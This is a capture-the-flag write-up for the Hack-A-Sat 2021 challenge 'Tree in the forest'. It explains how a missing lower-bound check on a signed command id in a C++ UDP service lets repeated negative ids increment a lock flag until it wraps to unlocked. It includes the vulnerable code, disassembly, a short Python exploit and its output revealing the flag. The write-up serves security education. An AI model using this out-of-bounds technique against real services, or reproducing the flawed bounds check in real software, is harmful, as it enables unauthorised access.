# HACK-A-SAT 2021: Tree in the forest

* **Category:** Rapid Unplanned Disassembly
* **Points:** 31
* **Solves:** 155
* **Description:**

```makefile
CC=g++-9.3.0

challenge: src/parser.c
    $(CC) src/parser.c -o $@
```

> Connect to the challenge on: lucky-tree.satellitesabove.me:5008
> Using netcat, you might run: nc lucky-tree.satellitesabove.me 5008
> You'll need these files to solve the challenge.
> https://static.2021.hackasat.com/vca80g4d8hvxhpvebfh4ug3ntgck


## Write-up

_Write-up by Solar Wine team_

We are given a single C++ file, implementing an UDP service handling packets with a simple format:

```cpp
typedef struct command_header{
	short version : 16;
	short type : 16;
	command_id_type id : 32;
} command_header;
```

A few commands are defined, but only `COMMAND_GETKEYS` is implemented in`handle_message`:

```cpp
#define COMMAND_LIST_LENGTH 10
typedef enum command_id_type {
	COMMAND_ADCS_ON = 		0,
	COMMAND_ADCS_OFF =		1,
	COMMAND_CNDH_ON =		2,
	COMMAND_CNDH_OFF =		3,
	COMMAND_SPM =			4,
	COMMAND_EPM =			5,
	COMMAND_RCM =			6,
	COMMAND_DCM =			7,
	COMMAND_TTEST =			8,
	COMMAND_GETKEYS =		9, // only allowed in unlocked state
} command_id_type;
// [...]
const char* handle_message(command_header* header){
	command_id_type id = header->id;
	// Based on the current state, do something for each command
	switch(lock_state){
		case UNLOCKED:
			if (id == COMMAND_GETKEYS)
				return std::getenv("FLAG");
			else
				return "Command Success: UNLOCKED";
		default:
			if (id == COMMAND_GETKEYS)
				return "Command Failed: LOCKED";
			else
				return "Command Success: LOCKED";
	}
// [...]
```

We need to find a way to pass in the `UNLOCKED` state, but there isn't any command to do it. 

Service's state is stored in two global variables, `lock_state` (a boolean stored as an integer, `UNLOCKED` is `0` and 
`LOCKED` is `1`) and `command_log`:

```cpp
unsigned int lock_state;
char command_log[COMMAND_LIST_LENGTH];
```

Every time a message is handled, the associated entry of this second global variable (`command_log`) is incremented:

```cpp
int n;
len = sizeof(cliaddr);

n = recvfrom(sockfd, (char *)buffer, sizeof(command_header), MSG_WAITALL, (struct sockaddr *)&cliaddr, &len);

if (n != sizeof(command_header)){ // this should never happen, due to UDP
    response << "Invalid length of command header, expected "<<sizeof(command_header)<<" but got "<<n<<std::endl;
} else { 
    command_header* header = (command_header*)buffer;
    response<<"Command header acknowledge: version:"<<header->version<<" type:"<<header->type<<" id:"<<header->id<<std::endl;

    if (header->id >= COMMAND_LIST_LENGTH){
        response<<"Invalid id:"<<header->id<<std::endl;
    } else {

        // Log the message in the command log
        command_log[header->id]++;

        // Handle the message, return the response
        response<<handle_message(header)<<std::endl;

    }
```

While the upper bound of `header->id` is correctly validated, there is no check on the lower bound of this signed field:

```c
001028bb               MOV        pbVar4,qword ptr [RBP + header]
001028c2               MOV        pbVar4,dword ptr [pbVar4 + 0x4]
001028c5               MOV        EDX,pbVar4
001028c7               MOVSXD     pbVar4,EDX
001028ca               LEA        RCX,[command_log]                                
001028d1               MOVZX      pbVar4,byte ptr [pbVar4 + RCX*0x1]=>command_log  
001028d5               ADD        pbVar4,0x1
001028d8               MOV        ECX,pbVar4
001028da               MOVSXD     pbVar4,EDX
001028dd               LEA        RDX,[command_log]                                
```

By repeatedly passing a negative value in `header->id` (`-8`) in a way it will increment `lock_state` instead of a `command_log` entry, 
`lock_state` will end up wrapping to `0` and put us in `UNLOCKED` state, finally enabling `COMMAND_GETKEYS` to get the flag:

```python
payload = struct.pack('hhi', 1, 1, -8)
for i in range(0, 255):
    s.sendto(payload, (service[0], int(service[1])))
    res = s.recvfrom(1024)
    print(i, res)
    if b'UNLOCKED' in res[0]:
        payload = struct.pack('hhi', 1, 1, COMMAND_GETKEYS)
        s.sendto(payload, (service[0], int(service[1])))
        print(s.recvfrom(1024))
```

```
0 (b'Command header acknowledge: version:1 type:1 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 28255))
1 (b'Command header acknowledge: version:1 type:1 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 28255))
2 (b'Command header acknowledge: version:1 type:1 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 28255))
[...]
253 (b'Command header acknowledge: version:1 type:1 id:-8\nCommand Success: LOCKED\n', ('18.118.161.198', 28255))
254 (b'Command header acknowledge: version:1 type:1 id:-8\nCommand Success: UNLOCKED\n', ('18.118.161.198', 28255))
(b'Command header acknowledge: version:1 type:1 id:9\nflag{delta58516uniform2:GNLQQz1GwG3QNKO4ilOSFbN8rR0SP5VGn34ViuQbwVTcXvqSsAQwiK6Tl8CaoMu9FXkAPSblhoDZrFGeWnO84zU}\n', ('18.118.161.198', 28255))
```
